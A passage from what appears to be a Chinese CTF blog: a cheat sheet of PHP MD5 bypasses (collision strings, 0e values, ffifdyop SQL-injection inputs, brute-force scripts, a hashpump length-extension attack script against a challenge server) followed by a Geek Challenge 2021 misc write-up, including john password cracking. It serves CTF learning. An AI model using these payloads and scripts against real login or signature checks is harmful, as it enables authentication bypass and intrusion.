class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])))<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>在<code>===</code>的情况下如果没有加类似<code>is_numeric</code>的函数进行过滤还是可以使用数组绕过，但是不能使用科学计数法绕过了</p>
<p><strong>方法三：MD5强碰撞</strong></p>
<p>可以使用<code>fastcoll</code>来碰撞出一组内容不同但md5值相同的值</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br></code></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/MD5%E5%BC%BA%E7%A2%B0%E6%92%9E.png"></p>
<h1 id="双MD5"><a href="#双MD5" class="headerlink" title="双MD5"></a>双MD5</h1><p>MD5和双MD5以后的值都是0e开头的</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure>

<h1 id="截断比较-暴力破解"><a href="#截断比较-暴力破解" class="headerlink" title="截断比较(暴力破解)"></a>截断比较(暴力破解)</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;auth&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) == <span class="hljs-string">&quot;666666&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>代码中需要md5后前6位为<code>666666</code><br>可以通过脚本进行爆破<br>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br><br><br>CHARS = string.letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp_md5</span>(<span class="hljs-params">substr, stop_event, str_len, start=<span class="hljs-number">0</span>, size=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-keyword">global</span> CHARS<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        rnds = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br>        md5 = hashlib.md5(rnds)<br><br>        <span class="hljs-keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:<br>            <span class="hljs-built_in">print</span> rnds<br>            stop_event.<span class="hljs-built_in">set</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    substr = sys.argv[<span class="hljs-number">1</span>].strip()<br><br>    start_pos = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>    str_len = <span class="hljs-built_in">len</span>(substr)<br>    cpus = multiprocessing.cpu_count()<br>    stop_event = multiprocessing.Event()<br>    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,<br>                                         stop_event, str_len, start_pos))<br>                 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cpus)]<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.start()<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.join()<br></code></pre></td></tr></table></figure>
<p>运行脚本<br>第一个参数是需要的字符串，第二个参数是从哪一位开始<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/md5%E7%9A%84%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83-1.png"><br>验证<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/md5%E7%9A%84%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83-2.png"></p>
<hr>
<p>补充一个升级版脚本，支持尾部添加字符串<br>例子：<br>假设字符串是随机的（指<code>12ba</code>和<code>91e0c</code>）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;auth&#x27;</span>].<span class="hljs-string">&quot;12ba&quot;</span>),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) == <span class="hljs-string">&quot;91e0c&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">&gt;python2 md5.py <span class="hljs-string">&quot;91e0c&quot;</span> <span class="hljs-number">0</span> <span class="hljs-number">12</span>ba<br><span class="hljs-number">1</span>KVErD6VijQCd9BrkPEl                 <span class="hljs-regexp">//</span>跑出的值，已经去除结尾<br></code></pre></td></tr></table></figure>

<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br><br><br>CHARS = string.letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp_md5</span>(<span class="hljs-params">substr, stop_event, str_len,off, start=<span class="hljs-number">0</span>, size=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-keyword">global</span> CHARS<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        rnds = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br>        rnds1 =rnds+ off<br>        md5 = hashlib.md5(rnds1)<br><br>        <span class="hljs-keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:<br>            <span class="hljs-built_in">print</span>( rnds)<br>            stop_event.<span class="hljs-built_in">set</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    substr = sys.argv[<span class="hljs-number">1</span>].strip()<br><br>    start_pos = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    off=sys.argv[<span class="hljs-number">3</span>]<br>    str_len = <span class="hljs-built_in">len</span>(substr)<br>    cpus = multiprocessing.cpu_count()<br>    stop_event = multiprocessing.Event()<br>    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,<br>                                         stop_event, str_len,off, start_pos))<br>                 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cpus)]<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.start()<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.join()<br></code></pre></td></tr></table></figure>

<h1 id="php中md5-str-true-注入"><a href="#php中md5-str-true-注入" class="headerlink" title="php中md5($str,true)注入"></a>php中md5($str,true)注入</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Success&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Failure&#x27;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们只需要找md5加密后字符串中是否存在<code>&#39;or&#39;</code>字符串</p>
<p>比如经典的<code>ffifdyop</code>，经过md5加密后<code>276f722736c95d99e921722cf9ed621c</code>，转字符串后就包含了<code>&#39;or&#39;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ffifdyop.png"></p>
<p>其他的例子和exp</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">ffifdyop<br>4SV7p<br>bJm4aG<br>bNas5p<br>ckHAEb<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calc_md5_true</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$md5_true</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$s</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$md5_true</span>,<span class="hljs-string">&quot;&#x27;or&#x27;&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>.PHP_EOL;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getstr</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span>, <span class="hljs-variable">$s</span>, <span class="hljs-variable">$slen</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>) == <span class="hljs-variable">$slen</span>) &#123;<br>        <span class="hljs-title function_ invoke__">calc_md5_true</span>(<span class="hljs-variable">$s</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>); <span class="hljs-variable">$i</span>++) &#123;<br><br>        <span class="hljs-variable">$sl</span> = <span class="hljs-variable">$s</span> . <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-title function_ invoke__">getstr</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$sl</span>, <span class="hljs-variable">$slen</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//字符串长度从3到30，肯定找得到</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">30</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-title function_ invoke__">getstr</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$i</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="HASH长度扩展攻击"><a href="#HASH长度扩展攻击" class="headerlink" title="HASH长度扩展攻击"></a>HASH长度扩展攻击</h1><p>在<code>$hash = md5($salt.$data)</code>中已知<code>$hash</code>和<code>$data</code>以及<code>$salt</code>的长度时<br>可以找到另一个<code>$_hash</code>和<code>$_data</code>使得<code>$_hash = md5($salt.$_data)</code>成立</p>
<h2 id="已知salt长度"><a href="#已知salt长度" class="headerlink" title="已知salt长度"></a>已知salt长度</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用<code>hashpump</code>进行计算</p>
<p>第一行是得到的hash值，即hash(salt+’adminroot’)<br>第二行是已知数据，即’adminroot’<br>第三行是salt长度<br>第四行是要添加的数据(这个随意，至少1位以上)</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/md5-hash2.png"></p>
<p><code>\x</code>替换为<code>%</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/md5-hash1.png"></p>
<h2 id="未知salt长度"><a href="#未知salt长度" class="headerlink" title="未知salt长度"></a>未知salt长度</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">攻击代码<br><br><span class="hljs-keyword">import</span> hashpumpy<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>	m=hashpumpy.hashpump(<span class="hljs-string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span>,<span class="hljs-string">&#x27;;\&quot;tseug\&quot;:5:s&#x27;</span>,<span class="hljs-string">&#x27;;\&quot;nimda\&quot;:5:s&#x27;</span>,i)<br>	<span class="hljs-built_in">print</span> i<br>	url=<span class="hljs-string">&#x27;http://120.26.131.152:32778/&#x27;</span><br>	digest=m[<span class="hljs-number">0</span>]<br><br>	message=urllib.quote(urllib.unquote(m[<span class="hljs-number">1</span>])[::-<span class="hljs-number">1</span>])<br>	cookie=<span class="hljs-string">&#x27;role=&#x27;</span>+message+<span class="hljs-string">&#x27;; hsh=&#x27;</span>+digest<br>	<span class="hljs-comment">#print cookie</span><br>	headers=&#123;<br>	<span class="hljs-string">&#x27;cookie&#x27;</span>: cookie,<br>	<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;</span>,<br>	<span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,<br>	<span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;:zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;</span>,<br>	<span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span><br>&#125;<br>	<span class="hljs-built_in">print</span> headers<br>	re=requests.get(url=url,headers=headers)<br>	<span class="hljs-built_in">print</span> re.text<br>	<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Welcome&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>		<span class="hljs-built_in">print</span> re;<br>		<span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">使用说明<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> hashpumpy<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">help</span>(hashpumpy.hashpump)<br>Help on built-<span class="hljs-keyword">in</span> function hashpump <span class="hljs-keyword">in</span> module hashpumpy:<br>hashpump(...)<br>    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)<br>    Arguments:<br>        hexdigest(<span class="hljs-built_in">str</span>):      Hex-encoded result of hashing key + original_data.<br>        original_data(<span class="hljs-built_in">str</span>):  Known data used to get the <span class="hljs-built_in">hash</span> result hexdigest.<br>        data_to_add(<span class="hljs-built_in">str</span>):    Data to append<br>        key_length(<span class="hljs-built_in">int</span>):     Length of unknown data prepended to the <span class="hljs-built_in">hash</span><br>    Returns:<br>        A <span class="hljs-built_in">tuple</span> containing the new <span class="hljs-built_in">hex</span> digest <span class="hljs-keyword">and</span> the new message.<br><span class="hljs-meta">&gt;&gt;&gt; </span>hashpumpy.hashpump(<span class="hljs-string">&#x27;ffffffff&#x27;</span>, <span class="hljs-string">&#x27;original_data&#x27;</span>, <span class="hljs-string">&#x27;data_to_add&#x27;</span>, <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;KEYKEYKEY&#x27;</span>))<br>(<span class="hljs-string">&#x27;e3c4a05f&#x27;</span>, <span class="hljs-string">&#x27;original_datadata_to_add&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>绕过</tag>
        <tag>md5</tag>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title>极客挑战2021-misc-wp</title>
    <url>/wp/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982021-misc-wp.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>个人感觉有几题出的不是很合理，但还是有收获的<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Geek-challenge2021-misc.png"></p>
<h1 id="In-the-Air"><a href="#In-the-Air" class="headerlink" title="In the Air"></a>In the Air</h1><blockquote>
<p>Intro &amp;&amp; Hint: 善于观察藏在身边的 flag， 提示：无线电会在空气中传播</p>
</blockquote>
<p>没啥好说的，只有校内能做，WiFI名字就是flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/IntheAir.png"></p>
<h1 id="easysend"><a href="#easysend" class="headerlink" title="easysend"></a>easysend</h1><blockquote>
<p>Intro &amp;&amp; Hint: (区块链)描述：请发送0.1Rospten测试币到0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470</p>
</blockquote>
<p>使用metamask发送0.1测试币<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/easysend-1.png"><br>复制hash值到题目连接中验证即可拿到flag<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/easysend-2.png"></p>
<h1 id="这是什么命令"><a href="#这是什么命令" class="headerlink" title="这是什么命令"></a>这是什么命令</h1><blockquote>
<p>Intro &amp;&amp; Hint: 命令执行的vps ip为 110.42.233.91 执行的命令 cat flag.png | base64 | base64 | tac | nl | sort -k 2 &gt; flag.txt ;rm -f flag.png &amp; nohup php -S 0.0.0.0:2333 &gt;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</p>
</blockquote>
<p>分开来分析<br>第一部分<code>cat flag.png | base64 | base64 | tac | nl | sort -k 2 &gt; flag.txt </code><br>tac：文件内容倒序输出<br>nl：输出文件内容并加上行号<br>sort -k 2：将内容从a-z排序后输出<br>所以第一条命令的含义就是将flag.png两次base64的值倒序后按A-Z加上行号输出至flag.txt</p>
<p>第二部分<code>rm -f flag.png &amp; nohup php -S 0.0.0.0:2333 &gt;&gt; /dev/null 2&gt;&amp;1 &amp;</code><br>rm -r：删除文件<br>nohup：不挂断地运行命令<br>php -S：启动内置的web服务器<br>所以第二条命令的含义是删除图片，并在后台不间断的运行web服务器，端口为2333</p>
<p>直接访问<code>http://110.42.233.91:2333/flag.txt</code>，拿到数据直接上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2333.txt&#x27;</span>)<br>d=f.readlines()<br>e=[<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">500</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    ca=i.strip().split()<br>    <span class="hljs-built_in">print</span>(base64.b64decode(ca[<span class="hljs-number">1</span>]))<br>    e[<span class="hljs-built_in">int</span>(ca[<span class="hljs-number">0</span>])]=base64.b64decode(ca[<span class="hljs-number">1</span>])<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2333.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>f.write(base64.b64decode(<span class="hljs-string">&#x27;&#x27;</span>.join(e[::-<span class="hljs-number">1</span>])))<br>f.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ok&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>flag在解出来的图片上</p>
<p>官方wp：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl http://110.42.233.91:2333/flag.txt | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">tac</span> | awk -F <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="hljs-built_in">base64</span> -d | <span class="hljs-built_in">base64</span> -d &gt; flag.png ; img2txt flag.png --nocolor --nohtml -- maxLen=30<br></code></pre></td></tr></table></figure>



<h1 id="easycreat"><a href="#easycreat" class="headerlink" title="easycreat"></a>easycreat</h1><blockquote>
<p>Intro &amp;&amp; Hint: 描述:在Rospten测试链部署一个合约</p>
</blockquote>
<p><a href="https://www.lewiserii.top/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%9C%A8Rospten%E6%B5%8B%E8%AF%95%E9%93%BE%E9%83%A8%E7%BD%B2%E4%B8%80%E4%B8%AA%E5%90%88%E7%BA%A6.html">单独拿出来写了一篇文章</a><br>提交hash验证即可</p>
<h1 id="今天有被破防吗？"><a href="#今天有被破防吗？" class="headerlink" title="今天有被破防吗？"></a>今天有被破防吗？</h1><blockquote>
<p>Intro &amp;&amp; Hint: 每个人都有决定自己是谁的权力</p>
</blockquote>
<p>三个一组的十六进制值，很容易想到RGB<br>因为一共有1166400行，是1080的平方数，得出原图片高宽为1080<br>脚本还原</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">1080</span>,<span class="hljs-number">1080</span>))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ans.txt&#x27;</span>)<br>d=f.readlines()<br>d=[<span class="hljs-built_in">tuple</span>([<span class="hljs-built_in">int</span>(i.strip().split()[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>),<span class="hljs-built_in">int</span>(i.strip().split()[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>),<span class="hljs-built_in">int</span>(i.strip().split()[<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d]<br>a.putdata(d)<br>a.save(<span class="hljs-string">&#x27;ans.png&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/IZH0bQ.png"><br>可以使用gaps拼图，先用画图量出小区域的高宽<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BB%8A%E5%A4%A9%E6%9C%89%E8%A2%AB%E7%A0%B4%E9%98%B2%E5%90%97-1.png"></p>
<p><code>gaps --image=1.png  --size=40 --save</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BB%8A%E5%A4%A9%E6%9C%89%E8%A2%AB%E7%A0%B4%E9%98%B2%E5%90%97-2.png"></p>
<p>最后垂直翻转一下图片得到flag</p>
<h1 id="说实话挺好玩的，不是吗？"><a href="#说实话挺好玩的，不是吗？" class="headerlink" title="说实话挺好玩的，不是吗？"></a>说实话挺好玩的，不是吗？</h1><blockquote>
<p>Intro &amp;&amp; Hint: 你要是觉得好玩，那就玩玩这个</p>
</blockquote>
<p>解压后是一个带密码的docx文件<br>压缩包中的提示<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%AF%B4%E5%AE%9E%E8%AF%9D%E6%8C%BA%E5%A5%BD%E7%8E%A9%E7%9A%84%EF%BC%8C%E4%B8%8D%E6%98%AF%E5%90%97-1.png"><br>使用john爆破密码<br>结果是<code>767675</code>，挺坑的，以为是8位数字，爆了两天没出<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%AF%B4%E5%AE%9E%E8%AF%9D%E6%8C%BA%E5%A5%BD%E7%8E%A9%E7%9A%84%EF%BC%8C%E4%B8%8D%E6%98%AF%E5%90%97-2.png"><br>将docx内容复制到txt用十六进制查看，可能是snow加密<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%AF%B4%E5%AE%9E%E8%AF%9D%E6%8C%BA%E5%A5%BD%E7%8E%A9%E7%9A%84%EF%BC%8C%E4%B8%8D%E6%98%AF%E5%90%97-3.png"><br><code>snow.exe -C ans.txt</code>解密文本<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%AF%B4%E5%AE%9E%E8%AF%9D%E6%8C%BA%E5%A5%BD%E7%8E%A9%E7%9A%84%EF%BC%8C%E4%B8%8D%E6%98%AF%E5%90%97-4.png"></p>
